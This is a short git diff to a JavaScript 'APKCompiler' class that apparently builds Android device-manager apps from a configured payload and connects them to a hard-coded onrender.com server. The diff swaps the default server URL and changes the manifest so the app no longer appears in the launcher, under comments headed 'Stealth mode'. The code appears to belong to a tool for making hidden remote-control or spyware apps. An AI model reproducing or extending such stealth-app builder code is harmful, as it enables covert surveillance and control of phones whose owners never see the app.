@@ -118,7 +118,7 @@ class APKCompiler {
       let serverUrl = config.payloadCode || 
                       process.env.API_URL || 
                       process.env.RENDER_EXTERNAL_URL || 
-                      "https://android-device-manager-one-1.onrender.com";
+                      "https://android-device-manager-one.onrender.com";
 
       
       // Force HTTPS for generic subdomains in production
@@ -431,12 +431,7 @@ class APKCompiler {
 
       manifest = manifest.replace(
         /<category android:name="android.intent.category.LAUNCHER"\/>/g,
-        `<category android:name="android.intent.category.LAUNCHER"/>
-        <!-- Stealth mode: remove from launcher -->
-      </intent-filter>
-      <intent-filter>
-        <action android:name="android.intent.action.VIEW"/>
-        <category android:name="android.intent.category.DEFAULT"/>`
+        `<!-- <category android:name="android.intent.category.LAUNCHER"/> -->`
       );
 
       // Stealth mode: just ensure it's not prominently labeled as "Android Manager"
